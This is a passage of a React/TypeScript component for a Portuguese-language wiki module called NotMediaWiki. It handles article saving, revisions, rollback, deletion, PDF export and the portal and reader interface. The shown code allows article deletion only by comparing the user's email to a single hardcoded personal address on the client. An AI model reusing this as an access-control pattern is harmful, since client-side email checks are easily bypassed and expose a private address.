  const handleOpenNewArticle = () => {
    setEditorTitle('');
    setEditorWikitext(`== Introdução ==\nEscreva aqui a introdução do novo verbete...\n\n== Seções ==\n* Tópico 1\n* Tópico 2\n\n== Referências ==\n<references />\n\n[[Category:Geral]]`);
    setEditorSummary('Criação de novo verbete');
    setEditorFieldErrors({});
    setActiveTab('editor');
  };

  // Save or Update Article Revision (supports Namespace 2 Personal User Pages via /userpage/{uid})
  const handleSaveArticle = async (e: React.FormEvent) => {
    e.preventDefault();
    const candidateSlug = editorTitle.trim() ? editorTitle.trim().replace(/\s+/g, '_') : '';
    const existingIndex = candidateSlug
      ? articles.findIndex((a) => a.slug.toLowerCase() === candidateSlug.toLowerCase())
      : -1;
    const existingArticle = existingIndex >= 0 ? articles[existingIndex] : null;
    const isPersonalPageTarget = Boolean(
      existingArticle?.namespace === 2 ||
        existingArticle?.isPersonalUserPage ||
        /^usu[aá]rio:/i.test(editorTitle.trim())
    );

    const validation = validateWikiArticlePayload({
      id: existingArticle?.id || (isPersonalPageTarget && currentUser?.uid ? `userpage-${currentUser.uid}` : `art-${Date.now()}`),
      slug: existingArticle?.slug || candidateSlug,
      title: editorTitle,
      namespace: isPersonalPageTarget
        ? 2
        : editorTitle.trim().startsWith('Talk:') || editorTitle.trim().startsWith('Discussão:')
        ? 1
        : 0,
      wikitext: editorWikitext,
      summary: editorSummary.trim() || undefined,
      categories: existingArticle?.categories || (isPersonalPageTarget ? ['Usuários', 'NotMediaWiki'] : ['Geral', 'Comunidade']),
      views: existingArticle ? (existingArticle.views || 0) + 1 : 1
    });

    if (!validation.valid || !validation.data) {
      setEditorFieldErrors(validation.fieldErrors);
      showToast(validation.message, true);
      return;
    }

    setEditorFieldErrors({});
    const validatedWiki = validation.data;

    setIsSavingArticle(true);
    try {
      const slug = isPersonalPageTarget
        ? existingArticle?.slug || editorTitle.trim().replace(/\s+/g, '_')
        : validatedWiki.slug;
      const authorName = currentUser?.displayName || currentUser?.name || currentUser?.email || 'Editor Comunitário';
      const authorId = currentUser?.uid || 'usr_community';

      const revId = `rev-${Date.now().toString(36)}-${Math.random().toString(36).substring(2, 6)}`;
      const newRev: WikiRevision = {
        id: revId,
        articleSlug: slug,
        parentRevisionId: existingArticle?.latestRevisionId || currentArticle?.latestRevisionId || null,
        wikitext: validatedWiki.wikitext,
        comment: editorSummary.trim() || 'Atualização de conteúdo no banco de dados',
        author: { id: authorId, name: authorName, isBot: false },
        timestamp: new Date().toISOString(),
        sha256: computeSha256Hex(validatedWiki.wikitext),
        byteSize: validatedWiki.wikitext.length,
        isMinor: editorIsMinor
      };

      let savedArt: WikiArticle;

      if (existingArticle) {
        savedArt = {
          ...existingArticle,
          title: validatedWiki.title,
          slug,
          namespace: isPersonalPageTarget ? 2 : existingArticle.namespace,
          wikitext: validatedWiki.wikitext,
          summary: validatedWiki.summary,
          latestRevisionId: revId,
          updatedAt: new Date().toISOString(),
          views: validatedWiki.views,
          ...(isPersonalPageTarget ? { isPersonalUserPage: true } : {})
        };
      } else {
        savedArt = {
          id: validatedWiki.id,
          slug,
          title: validatedWiki.title,
          namespace: isPersonalPageTarget ? 2 : validatedWiki.namespace,
          wikitext: validatedWiki.wikitext,
          summary: validatedWiki.summary,
          latestRevisionId: revId,
          createdAt: new Date().toISOString(),
          updatedAt: new Date().toISOString(),
          categories: validatedWiki.categories,
          views: validatedWiki.views,
          ...(isPersonalPageTarget
            ? {
                ownerUid: currentUser?.uid || 'usr_community',
                isPersonalUserPage: true
              }
            : {})
        };
      }

      if (isPersonalPageTarget) {
        await saveNotMediaWikiUserPageToDb(savedArt, newRev);
      } else {
        await saveWikiArticleInDb(savedArt, newRev);
      }

      setArticles((prev) => {
        const without = prev.filter((a) => a.slug.toLowerCase() !== slug.toLowerCase());
        return [savedArt, ...without];
      });
      setRevisions((prev) => [newRev, ...prev]);

      // Add to events stream
      const newEvent: WikiEvent = {
        id: `evt-${Date.now()}`,
        meta: {
          uri: `https://notmediawiki.wazzimagiygg.com/wiki/${slug}`,
          request_id: `req-${Date.now()}`,
          id: `uuid-${Date.now()}`,
          dt: new Date().toISOString(),
          domain: 'notmediawiki.wazzimagiygg.com',
          stream: 'mediawiki.recentchange'
        },
        database: 'wzzmwiki',
        page_title: validatedWiki.title,
        page_namespace: savedArt.namespace,
        rev_id: revId,
        rev_timestamp: new Date().toISOString(),
        rev_sha1: newRev.sha256,
        rev_minor_edit: editorIsMinor,
        rev_len: validatedWiki.wikitext.length,
        user_text: authorName,
        comment: editorSummary || 'Edição no acervo',
        type: existingArticle ? 'edit' : 'new'
      };
      setEvents((prev) => [newEvent, ...prev]);

      if (!existingArticle && !isPersonalPageTarget && savedArt.namespace === 0) {
        const activeUid = currentUser?.uid || 'all';
        pushLocalUserNotification(activeUid, {
          id: `local_art_${slug}`,
          titulo: `Novo verbete no NotMediaWiki: ${validatedWiki.title}`,
          mensagem: `${validatedWiki.summary || 'Nova entrada enciclopédica publicada no acervo.'}`,
          tipo: 'noticia',
          prioridade: 'info',
          actionUid: slug,
          actionTab: 'notmediawiki',
          actionLabel: 'Ler Verbete'
        });

        dispatchNewArticlePushNotification(
          {
            id: slug,
            title: validatedWiki.title,
            summary: validatedWiki.summary,
            collection: 'notmediawiki',
            sector: validatedWiki.categories?.[0] || 'NotMediaWiki',
            author: authorName,
            isWiki: true
          },
          {
            userId: activeUid,
            onClickNavigate: (targetSlug) => {
              setCurrentSlug(targetSlug);
              setActiveTab('reader');
            }
          }
        );
      }

      setCurrentSlug(slug);
      setActiveTab('reader');
      showToast(
        isPersonalPageTarget
          ? `✓ Página pessoal "${validatedWiki.title}" salva e registrada em suas contribuições!`
          : `✓ Artigo "${validatedWiki.title}" gravado com sucesso no banco de dados!`
      );
    } catch (err: any) {
      if (err instanceof ArticleValidationError) {
        setEditorFieldErrors(err.fieldErrors);
        showToast(err.message, true);
      } else {
        showToast(err?.message || 'Erro ao gravar artigo no banco de dados.', true);
      }
    } finally {
      setIsSavingArticle(false);
    }
  };

  // Rollback Revision in Database
  const handleRollback = async (revToRestore: WikiRevision) => {
    if (!currentArticle) return;
    if (!window.confirm(`Confirma reverter "${currentArticle.title}" para a versão de ${new Date(revToRestore.timestamp).toLocaleString('pt-BR')} por ${revToRestore.author.name}?`)) {
      return;
    }

    const revId = `rev-rb-${Date.now().toString(36)}`;
    const rollbackRev: WikiRevision = {
      id: revId,
      articleSlug: currentArticle.slug,
      parentRevisionId: currentArticle.latestRevisionId,
      wikitext: revToRestore.wikitext,
      comment: `Reversão para a revisão ${revToRestore.id} de ${revToRestore.author.name}`,
      author: {
        id: currentUser?.uid || 'sysop',
        name: currentUser?.displayName || currentUser?.email || 'Burocrata WZZM',
        isBot: false
      },
      timestamp: new Date().toISOString(),
      sha256: revToRestore.sha256,
      byteSize: revToRestore.wikitext.length,
      isMinor: true
    };

    const updatedArticle = {
      ...currentArticle,
      wikitext: revToRestore.wikitext,
      latestRevisionId: revId,
      updatedAt: new Date().toISOString()
    };

    try {
      await saveWikiArticleInDb(updatedArticle, rollbackRev);
      setArticles((prev) =>
        prev.map((a) => (a.slug === currentArticle.slug ? updatedArticle : a))
      );
      setRevisions((prev) => [rollbackRev, ...prev]);
      showToast(`✓ Artigo revertido e gravado no banco de dados.`);
    } catch {
      showToast('Erro ao salvar reversão no banco de dados.', true);
    }
  };

  // Delete Article from Database (Exclusive for Burocrata)
  const handleDeleteArticle = async (slugToDelete: string) => {
    const isBureaucrat = currentUser?.email?.toLowerCase() === 'pedrohenriquecardonaperes@gmail.com';
    if (!isBureaucrat) {
      showToast('Apenas o Burocrata oficial (pedrohenriquecardonaperes@gmail.com) pode excluir artigos do banco de dados.', true);
      return;
    }
    if (!window.confirm(`Confirma a exclusão definitiva do artigo "${slugToDelete}" do banco de dados?`)) {
      return;
    }
    try {
      await deleteWikiArticleFromDb(slugToDelete);
      setArticles((prev) => prev.filter((a) => a.slug.toLowerCase() !== slugToDelete.toLowerCase()));
      setRevisions((prev) => prev.filter((r) => r.articleSlug.toLowerCase() !== slugToDelete.toLowerCase()));
      showToast(`Artigo "${slugToDelete}" excluído com sucesso do banco de dados.`);
      setCurrentSlug('');
      setActiveTab('portal');
    } catch {
      showToast('Erro ao excluir artigo do banco de dados.', true);
    }
  };

  // Export Wiki Article to Formatted PDF (Preserving Original Wikitext & HTML Structure)
  const handleExportWikiToPdf = async () => {
    if (!currentArticle) {
      showToast('Nenhum artigo selecionado para exportar.', true);
      return;
    }

    try {
      setIsExportingPdf(true);
      showToast('Renderizando verbete original com formatação em PDF...');
      await exportWikiArticleFormattedPdf(currentArticle, parseResult.html, {
        onProgress: (statusMsg) => showToast(statusMsg)
      });
      showToast(`✓ Documento original formatado "${currentArticle.title}" exportado em PDF com sucesso!`);
    } catch (err: any) {
      showToast('Erro ao exportar PDF formatado: ' + err.message, true);
    } finally {
      setIsExportingPdf(false);
    }
  };

  // Filtered articles for Search + Namespace Filter
  const filteredArticles = useMemo(() => {
    const nsFiltered =
      portalNamespaceFilter === 'all'
        ? articles
        : articles.filter((a) => a.namespace === portalNamespaceFilter);
    if (!searchQuery.trim()) return nsFiltered;
    const q = searchQuery.trim().toLowerCase();
    return nsFiltered.filter(
      (a) =>
        a.title.toLowerCase().includes(q) ||
        a.summary.toLowerCase().includes(q) ||
        a.wikitext.toLowerCase().includes(q) ||
        a.categories.some((c) => c.toLowerCase().includes(q))
    );
  }, [articles, searchQuery, portalNamespaceFilter]);

  return (
    <div className="space-y-6 text-left font-sans animate-fade-in">
      {/* 1. TOP NOTMEDIAWIKI IDENTITY BANNER */}
      <div className="bg-gradient-to-r from-[#0F172A] via-[#1E293B] to-[#0F172A] text-white p-6 border-4 border-[#141414] shadow-[6px_6px_0px_0px_rgba(20,20,20,1)] relative overflow-hidden">
        <div className="flex flex-col lg:flex-row lg:items-center justify-between gap-4 relative z-10">
          <div>
            <div className="flex flex-wrap items-center gap-2 mb-2">
              <span className="bg-blue-600 text-white font-mono text-[10px] font-bold px-2 py-0.5 uppercase tracking-wider">
                Módulo Integrado
              </span>
              <span className="bg-purple-900 text-purple-200 border border-purple-400 font-mono text-[10px] font-bold px-2 py-0.5">
                Parsoid AST • Node.js Mesh
              </span>
              <span className="bg-emerald-900 text-emerald-200 border border-emerald-400 font-mono text-[10px] font-bold px-2 py-0.5">
                Zero-Trust ABAC
              </span>
            </div>

            <div className="flex items-center gap-3">
              <div className="w-10 h-10 bg-white text-stone-900 border-2 border-black flex items-center justify-center font-editorial font-bold text-2xl shadow-[2px_2px_0px_0px_rgba(255,255,255,0.4)]">
                W
              </div>
              <div>
                <h2 className="font-editorial text-2xl sm:text-3xl font-bold tracking-tight text-white flex flex-wrap items-center gap-2">
                  <span>NotMediaWiki</span>
                  <span className="text-xs font-mono font-bold text-amber-300 bg-amber-950/90 px-2 py-0.5 border border-amber-500">
                    {WIKI_SITE_DISPLAY_ID}
                  </span>
                </h2>
                <p className="text-xs font-mono text-stone-300 mt-0.5">
                  Base de conhecimento colaborativa e microsserviços Parsoid do ecossistema WazzimaGiygg.
                </p>
              </div>
            </div>
          </div>

          <div className="flex flex-wrap items-center gap-2.5 shrink-0">
            {myPersonalUserPage && (
              <button
                type="button"
                onClick={() => handleNavigateSlug(myPersonalUserPage.slug)}
                className="bg-emerald-700 hover:bg-emerald-600 text-white px-3.5 py-2 text-xs font-mono font-bold uppercase tracking-wider flex items-center gap-1.5 border border-emerald-400 shadow-[3px_3px_0px_0px_rgba(0,0,0,1)] cursor-pointer"
                title={`Abrir sua página pessoal (${myPersonalUserPage.title}) e suas contribuições`}
              >
                <UserCheck className="w-3.5 h-3.5 text-amber-300" />
                <span>Minha Página ({myContributionsCount} contrib.)</span>
              </button>
            )}

            <button
              type="button"
              onClick={handleOpenRandomArticle}
              className="bg-stone-800 hover:bg-stone-700 text-stone-100 px-3.5 py-2 text-xs font-mono font-bold uppercase tracking-wider flex items-center gap-1.5 border border-stone-500 shadow-[3px_3px_0px_0px_rgba(0,0,0,1)] cursor-pointer"
              title="Sortear e ler um artigo aleatório no NotMediaWiki"
            >
              <Shuffle className="w-3.5 h-3.5 text-amber-300" />
              <span>Artigo Aleatório</span>
            </button>

            <button
              type="button"
              onClick={() => setActiveTab('tutorial')}
              className="bg-stone-800 hover:bg-stone-700 text-amber-300 px-3.5 py-2 text-xs font-mono font-bold uppercase tracking-wider flex items-center gap-1.5 border border-amber-500/60 shadow-[3px_3px_0px_0px_rgba(0,0,0,1)] cursor-pointer"
            >
              <Sparkles className="w-3.5 h-3.5" />
              <span>Tutorial Infobox</span>
            </button>

            <a
              href="https://notmediawiki.wazzimagiygg.com/"
              target="_blank"
              rel="noopener noreferrer"
              className="bg-blue-600 hover:bg-blue-700 text-white px-3.5 py-2 text-xs font-mono font-bold uppercase tracking-wider flex items-center gap-1.5 border border-blue-400 shadow-[3px_3px_0px_0px_rgba(0,0,0,1)] transition-transform active:translate-x-0.5 active:translate-y-0.5"
            >
              <span>notmediawiki.wazzimagiygg.com</span>
              <ExternalLink className="w-3.5 h-3.5" />
            </a>

            <button
              onClick={handleOpenNewArticle}
              className="bg-amber-500 hover:bg-amber-600 text-stone-950 px-3.5 py-2 text-xs font-mono font-bold uppercase tracking-wider flex items-center gap-1.5 border border-amber-300 shadow-[3px_3px_0px_0px_rgba(0,0,0,1)] cursor-pointer"
            >
              <Plus className="w-4 h-4" />
              <span>Novo Verbete</span>
            </button>
          </div>
        </div>
      </div>

      {/* 2. INNER WIKI SUB-NAVIGATION BAR */}
      <nav className="bg-[#EBE8E1] border-2 border-[#141414] p-1.5 shadow-[4px_4px_0px_0px_rgba(20,20,20,1)] overflow-x-auto no-scrollbar">
        <div className="flex items-center gap-1.5 font-mono text-xs font-bold uppercase tracking-wider">
          {[
            { id: 'portal', label: 'Portal Comunitário', icon: Compass },
            { id: 'reader', label: currentArticle ? `Verbete: ${currentArticle.title}` : 'Leitor de Verbete', icon: BookOpen },
            { id: 'editor', label: 'Editor Wikitexto', icon: Edit3 },
            { id: 'tutorial', label: 'Tutorial Infobox', icon: Sparkles },
            { id: 'history', label: 'Histórico & Diff', icon: GitCompare },
            { id: 'events', label: 'EventStreams ao Vivo', icon: Zap },
            { id: 'special', label: 'Páginas Especiais', icon: List },
            { id: 'extensions', label: `Extensões & Segurança (${extensions.length})`, icon: ShieldCheck },
            { id: 'governance', label: 'Governança & ArbCom', icon: Shield }
          ].map((tab) => {
            const Icon = tab.icon;
            const isActive = activeTab === tab.id;
            return (
              <button
                key={tab.id}
                onClick={() => setActiveTab(tab.id as NotMediaWikiInnerTab)}
                className={`flex items-center gap-1.5 px-3 py-2 whitespace-nowrap transition-all cursor-pointer border ${
                  isActive
                    ? 'bg-[#141414] text-white border-[#141414] shadow-[2px_2px_0px_0px_rgba(20,20,20,1)]'
                    : 'bg-transparent text-stone-800 border-transparent hover:bg-stone-300'
                }`}
              >
                <Icon className={`w-3.5 h-3.5 ${isActive ? 'text-amber-400' : 'text-stone-600'}`} />
                <span>{tab.label}</span>
              </button>
            );
          })}
          <button
            type="button"
            onClick={handleOpenRandomArticle}
            className="ml-auto flex items-center gap-1.5 px-3 py-2 whitespace-nowrap transition-all cursor-pointer border border-[#141414] bg-amber-100 hover:bg-amber-200 text-stone-950 shadow-[2px_2px_0px_0px_rgba(20,20,20,1)]"
            title="Especial:Aleatório — Abrir um artigo aleatório do acervo"
          >
            <Shuffle className="w-3.5 h-3.5 text-amber-800" />
            <span>Artigo Aleatório</span>
          </button>
        </div>
      </nav>

      {/* ===================================================================== */}
      {/* TAB 1: PORTAL COMUNITÁRIO (HOME)                                      */}
      {/* ===================================================================== */}
      {activeTab === 'portal' && (
        <div className="space-y-6">
          {/* Welcome Card */}
          <div className="bg-white border-2 border-[#141414] p-6 shadow-[6px_6px_0px_0px_rgba(20,20,20,1)]">
            <div className="border-b-2 border-[#141414] pb-4 mb-4">
              <div className="flex flex-col sm:flex-row sm:items-center justify-between gap-3">
                <div>
                  <h3 className="font-editorial text-2xl font-bold text-stone-950">
                    Bem-vindo(a) ao NotMediaWiki
                  </h3>
                  <p className="text-xs font-mono text-stone-600 mt-1">
                    A enciclopédia livre desacoplada dos projetos <strong>WazzimaGiygg</strong> (wazzimagiygg.com).
                  </p>
                </div>
                <div className="flex flex-wrap items-center gap-2">
                  <button
                    type="button"
                    onClick={() => setActiveTab('tutorial')}
                    className="bg-amber-100 hover:bg-amber-200 text-amber-950 border border-amber-700 px-3 py-1.5 text-xs font-mono font-bold uppercase tracking-wider flex items-center gap-1.5 cursor-pointer"
                  >
                    <Sparkles className="w-3.5 h-3.5 text-amber-700" />
                    <span>Como Usar Infobox</span>
                  </button>
                  <button
                    type="button"
                    onClick={handleOpenRandomArticle}
                    className="paper-button-secondary px-3 py-1.5 text-xs font-mono font-bold uppercase tracking-wider flex items-center gap-1.5 cursor-pointer"
                    title="Abrir verbete aleatório no NotMediaWiki"
                  >
                    <Shuffle className="w-3.5 h-3.5" />
                    <span>Artigo Aleatório</span>
                  </button>
                </div>
              </div>
            </div>

            {/* Quick Metrics */}
            <div className="grid grid-cols-2 sm:grid-cols-4 gap-3 font-mono text-xs my-4">
              <div className="bg-[#FAF9F5] p-3 border border-stone-300">
                <span className="text-[10px] text-stone-500 uppercase font-bold">Páginas &amp; Usuários</span>
                <div className="text-2xl font-bold text-stone-900 mt-1">{articles.length}</div>
              </div>
              <div className="bg-[#FAF9F5] p-3 border border-stone-300">
                <span className="text-[10px] text-stone-500 uppercase font-bold">Revisões Gravadas</span>
                <div className="text-2xl font-bold text-stone-900 mt-1">{revisions.length}</div>
              </div>
              <div className="bg-[#FAF9F5] p-3 border border-stone-300">
                <span className="text-[10px] text-stone-500 uppercase font-bold">Páginas de Usuário</span>
                <div className="text-2xl font-bold text-amber-700 mt-1">
                  {articles.filter((a) => a.namespace === 2 || a.isPersonalUserPage).length}
                </div>
              </div>
              <div className="bg-[#FAF9F5] p-3 border border-stone-300">
                <span className="text-[10px] text-stone-500 uppercase font-bold">Parser Parsoid</span>
                <div className="text-sm font-bold text-emerald-700 mt-1">✓ AST &amp; Infobox Ativos</div>
              </div>
            </div>

            {/* Search Input + Namespace Filter */}
            <div className="flex flex-col md:flex-row md:items-center gap-3 my-4">
              <div className="relative flex-1">
                <Search className="w-4 h-4 absolute left-3 top-3 text-stone-400" />
                <input
                  type="text"
                  placeholder="Pesquisar verbetes ou páginas de usuário (Usuário:...) no NotMediaWiki..."
                  value={searchQuery}
                  onChange={(e) => setSearchQuery(e.target.value)}
                  className="w-full pl-9 pr-4 py-2.5 text-xs font-mono bg-[#F8F7F4] border border-[#141414] focus:outline-none"
                />
              </div>

              <div className="flex flex-wrap items-center gap-1.5 font-mono text-[10px] font-bold uppercase">
                {[
                  { id: 'all' as const, label: 'Todos' },
                  { id: 0 as const, label: 'Artigos (Ns 0)' },
                  { id: 2 as const, label: 'Usuários (Ns 2)' },
                  { id: 1 as const, label: 'Discussões (Ns 1)' }
                ].map((nsOpt) => (
                  <button
                    key={String(nsOpt.id)}
                    type="button"
                    onClick={() => setPortalNamespaceFilter(nsOpt.id)}
                    className={`px-2.5 py-2 border cursor-pointer transition-colors ${
                      portalNamespaceFilter === nsOpt.id
                        ? 'bg-[#141414] text-amber-300 border-[#141414]'
                        : 'bg-[#FAF9F5] text-stone-700 border-stone-300 hover:border-[#141414]'
                    }`}
                  >
                    {nsOpt.label}
                  </button>
                ))}
              </div>
            </div>

            {/* Articles Grid */}
            {isLoadingWikiData ? (
              <div className="p-12 text-center text-stone-500 font-mono text-xs flex flex-col items-center justify-center gap-3">
                <div className="w-6 h-6 border-2 border-stone-800 border-t-amber-500 rounded-full animate-spin" />
                <p>Sincronizando verbetes e páginas pessoais do banco de dados (Firestore)...</p>
              </div>
            ) : filteredArticles.length === 0 ? (
              <div className="p-10 border border-dashed border-stone-400 bg-stone-50 text-center font-mono text-xs space-y-3">
                <BookOpen className="w-10 h-10 mx-auto text-stone-400" />
                <p className="font-bold text-stone-800">Nenhum verbete encontrado neste filtro.</p>
                <p className="text-stone-500 text-[11px] max-w-md mx-auto">
                  A NotWikiPedia sincroniza dados persistidos no banco. Crie um verbete ou acesse o Tutorial Infobox!
                </p>
                <button
                  onClick={handleOpenNewArticle}
                  className="bg-[#141414] hover:bg-stone-800 text-white px-4 py-2 font-bold uppercase text-[10px] tracking-wider inline-flex items-center gap-1.5 cursor-pointer shadow-[2px_2px_0px_0px_rgba(0,0,0,1)]"
                >
                  <Plus className="w-3.5 h-3.5 text-amber-300" />
                  <span>Criar Novo Verbete</span>
                </button>
              </div>
            ) : (
              <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-4 pt-2">
                {filteredArticles.map((art) => {
                  const isUserNs = art.namespace === 2 || art.isPersonalUserPage;
                  return (
                    <div
                      key={art.id}
                      className={`paper-card p-4 flex flex-col justify-between hover:border-black cursor-pointer group ${
                        isUserNs ? 'border-amber-600/70 bg-amber-50/30' : ''
                      }`}
                      onClick={() => handleNavigateSlug(art.slug)}
                    >
                      <div>
                        <div className="flex items-center justify-between text-[10px] font-mono text-stone-500 mb-2">
                          <span
                            className={`font-bold px-1.5 py-0.5 border uppercase ${
                              isUserNs
                                ? 'bg-amber-100 text-amber-900 border-amber-400'
                                : art.namespace === 1
                                ? 'bg-indigo-100 text-indigo-900 border-indigo-300'
                                : 'bg-stone-100 text-stone-800 border-stone-300'
                            }`}
                          >
                            {isUserNs ? 'Usuário (Ns 2)' : art.namespace === 1 ? 'Discussão' : 'Artigo'}
                          </span>
                          <span className="flex items-center gap-1">
                            <Eye className="w-3.5 h-3.5" />
                            <span>{art.views.toLocaleString()}</span>
                          </span>
                        </div>

                        <h4 className="font-editorial text-lg font-bold text-stone-950 group-hover:text-blue-800 transition-colors">
                          <HighlightedText text={art.title} query={searchQuery} />
                        </h4>

                        <p className="text-xs font-serif text-stone-600 line-clamp-3 mt-1.5 leading-relaxed">
                          <HighlightedText text={art.summary} query={searchQuery} />
                        </p>
                      </div>

                      <div className="pt-3 border-t border-stone-200 mt-3 flex items-center justify-between text-[10px] font-mono text-stone-500">
                        <span>Rev: {art.latestRevisionId}</span>
                        <span className="text-blue-700 font-bold group-hover:translate-x-1 transition-transform">
                          {isUserNs ? 'Ver perfil & contribuições ➔' : 'Ler verbete ➔'}
                        </span>
                      </div>
                    </div>
                  );
                })}
              </div>
            )}
          </div>
        </div>
      )}

      {/* ===================================================================== */}
      {/* TAB 2: WIKI READER (LEITOR ESTILO MEDIAWIKI)                          */}
      {/* ===================================================================== */}
      {activeTab === 'reader' && !currentArticle && (
        <div className="bg-[#FAF9F5] border-2 border-[#141414] p-10 text-center font-mono text-xs shadow-[6px_6px_0px_0px_rgba(20,20,20,1)] space-y-4">
          <BookOpen className="w-12 h-12 mx-auto text-stone-400" />
          <h3 className="font-editorial text-2xl font-bold text-stone-900">
            Nenhum Artigo Selecionado ou Cadastrado no Banco de Dados
          </h3>
          <p className="text-stone-600 max-w-md mx-auto">
            O acervo da NotWikiPedia sincroniza exclusivamente dados reais salvos no banco. Não há dados sugeridos ou simulados.
          </p>
          <div className="flex flex-wrap items-center justify-center gap-3">
            <button
              onClick={() => {
                setEditorTitle(currentSlug || 'Página_Principal');
                setEditorWikitext('== Introdução ==\nEscreva aqui o conteúdo do novo verbete no banco de dados...');
                setEditorSummary('Criação do verbete');
                setActiveTab('editor');
              }}
              className="paper-button bg-stone-900 text-white hover:bg-stone-800 px-4 py-2 font-bold uppercase tracking-wider inline-flex items-center gap-2 cursor-pointer"
            >
              <Plus className="w-4 h-4 text-amber-300" />
              <span>Criar Este Artigo no Banco</span>
            </button>
            {articles.length > 0 && (
              <button
                type="button"
                onClick={handleOpenRandomArticle}
                className="paper-button-secondary px-4 py-2 font-bold uppercase tracking-wider inline-flex items-center gap-2 cursor-pointer"
              >
                <Shuffle className="w-4 h-4" />
                <span>Artigo Aleatório</span>
              </button>
            )}
          </div>
        </div>
      )}

      {activeTab === 'reader' && currentArticle && (
        <div className="space-y-6">
          {/* Article Header Bar */}
          <div className="bg-[#FAF9F5] border-2 border-[#141414] p-6 shadow-[6px_6px_0px_0px_rgba(20,20,20,1)]">
            <div className="flex flex-col sm:flex-row sm:items-center justify-between gap-4 border-b-2 border-[#141414] pb-4 mb-6">
              <div>
                <div className="flex flex-wrap items-center gap-2 text-xs font-mono mb-1">
                  <span
                    className={`font-bold px-2 py-0.5 text-[10px] uppercase ${
                      currentArticle.namespace === 2 || currentArticle.isPersonalUserPage
                        ? 'bg-amber-600 text-white'
                        : 'bg-stone-900 text-white'
                    }`}
                  >
                    {currentArticle.namespace === 2 || currentArticle.isPersonalUserPage
                      ? 'Namespace 2 • Página de Usuário'
                      : currentArticle.namespace === 1
                      ? 'Namespace Discussão'
                      : 'Namespace Principal'}
                  </span>
                  <span className="text-stone-500">•</span>
                  <span className="text-stone-600">Revisão: {currentArticle.latestRevisionId}</span>
                  {currentArticle.isProtected && (
                    <span className="bg-amber-100 text-amber-900 border border-amber-400 font-bold px-1.5 py-0.2 text-[9px] uppercase flex items-center gap-1">
                      <Shield className="w-2.5 h-2.5" /> Protegido
                    </span>
                  )}
                </div>
                <h1 className="text-3xl sm:text-4xl font-editorial font-bold text-stone-950">
                  {currentArticle.title}
                </h1>
              </div>

              {/* Action Toolbar */}
              <div className="flex flex-wrap items-center gap-2">
                {(currentArticle.namespace === 2 || currentArticle.isPersonalUserPage) &&
                  currentArticle.ownerUid &&
                  onOpenUserInfobox && (
                    <button
                      type="button"
                      onClick={() => onOpenUserInfobox(currentArticle.ownerUid!)}
                      className="paper-button bg-amber-500 hover:bg-amber-400 text-stone-950 px-3 py-1.5 text-xs font-mono font-bold uppercase tracking-wider flex items-center gap-1.5 cursor-pointer"
                    >
                      <UserCheck className="w-3.5 h-3.5" />
                      <span>Cartão Infobox (?uid=)</span>
                    </button>
                  )}

                <button
                  onClick={() => handleOpenEditor(currentArticle)}
                  className="paper-button bg-stone-900 text-white hover:bg-stone-800 px-3 py-1.5 text-xs font-mono font-bold uppercase tracking-wider flex items-center gap-1.5 cursor-pointer"
                >
                  <Edit3 className="w-3.5 h-3.5 text-amber-300" />
                  <span>Editar Wikitexto</span>
                </button>

                <button
                  type="button"
                  onClick={handleOpenRandomArticle}
                  className="paper-button-secondary px-3 py-1.5 text-xs font-mono font-bold uppercase tracking-wider flex items-center gap-1.5 cursor-pointer"
                  title="Ir para outro artigo aleatório"
                >
                  <Shuffle className="w-3.5 h-3.5 text-amber-700" />
                  <span>Aleatório</span>
                </button>

                <button
                  onClick={() => setActiveTab('tutorial')}
                  className="paper-button-secondary px-3 py-1.5 text-xs font-mono font-bold uppercase tracking-wider flex items-center gap-1.5 cursor-pointer"
                >
                  <Sparkles className="w-3.5 h-3.5 text-amber-700" />
                  <span>Tutorial Infobox</span>
                </button>

                <button
                  onClick={() => setActiveTab('history')}
                  className="paper-button-secondary px-3 py-1.5 text-xs font-mono font-bold uppercase tracking-wider flex items-center gap-1.5 cursor-pointer"
                >
                  <Clock className="w-3.5 h-3.5" />
                  <span>Histórico ({articleRevisions.length})</span>
                </button>

                {currentUser?.email?.toLowerCase() === 'pedrohenriquecardonaperes@gmail.com' && (
                  <button
                    onClick={() => handleDeleteArticle(currentArticle.slug)}
                    className="paper-button bg-stone-800 hover:bg-red-800 text-stone-300 hover:text-white px-2.5 py-1.5 text-xs font-mono font-bold uppercase tracking-wider flex items-center gap-1 cursor-pointer"
                    title="Excluir do banco de dados (Burocrata)"
                  >
                    <Trash2 className="w-3.5 h-3.5" />
                    <span>Excluir</span>
                  </button>
                )}

                <button
                  onClick={handleExportWikiToPdf}
                  disabled={isExportingPdf}
                  className="paper-button bg-red-700 hover:bg-red-800 text-white px-3 py-1.5 text-xs font-mono font-bold uppercase tracking-wider flex items-center gap-1.5 cursor-pointer shadow-[2px_2px_0px_0px_rgba(20,20,20,1)] disabled:opacity-50"
                  title="Exportar verbete para PDF com jsPDF"
                >
                  <FileDown className="w-3.5 h-3.5 text-amber-300" />
                  <span>{isExportingPdf ? 'Gerando...' : 'Salvar como PDF'}</span>
                </button>

                <button
                  onClick={() => window.print()}
                  className="paper-button-secondary px-2.5 py-1.5 text-xs font-mono font-bold uppercase cursor-pointer"
                  title="Imprimir"
                >
                  <Printer className="w-3.5 h-3.5" />
                </button>
              </div>
            </div>

            {/* Table of Contents (TOC) if headings exist */}
            {parseResult.toc.length > 0 && (
              <div className="my-6 p-4 bg-stone-50 border border-stone-300 max-w-sm font-sans text-xs">
                <div className="font-bold text-stone-900 uppercase tracking-wider font-mono text-[11px] mb-2 border-b pb-1 flex items-center gap-2">
                  <List className="w-3.5 h-3.5 text-stone-600" />
                  <span>Índice / Conteúdo</span>
                </div>
                <ul className="space-y-1">
                  {parseResult.toc.map((item) => (
                    <li
                      key={item.id}
                      style={{ paddingLeft: `${(item.level - 1) * 12}px` }}
                      className="text-stone-700 hover:text-blue-700"
                    >
                      <a href={`#${item.id}`} className="hover:underline flex items-center gap-1.5">
                        <span className="font-mono text-stone-400 text-[10px]">{item.number}</span>
                        <span>{item.text}</span>
                      </a>
                    </li>
                  ))}
                </ul>
              </div>
            )}

            {/* Compiled HTML Content from Parsoid (flow-root ensures floated Infobox stays cleanly inside container) */}
            <div
              className="wiki-article-body flow-root prose prose-stone max-w-none font-serif text-stone-900 leading-relaxed text-base"
              onClick={(e) => {
                const target = e.target as HTMLElement;
                const wikiLink = target.closest('a[data-wikilink]') as HTMLAnchorElement | null;
                if (wikiLink) {
                  e.preventDefault();
                  const targetSlugAttr = wikiLink.getAttribute('data-wikilink');
                  if (targetSlugAttr) handleNavigateSlug(targetSlugAttr);
                  return;
                }
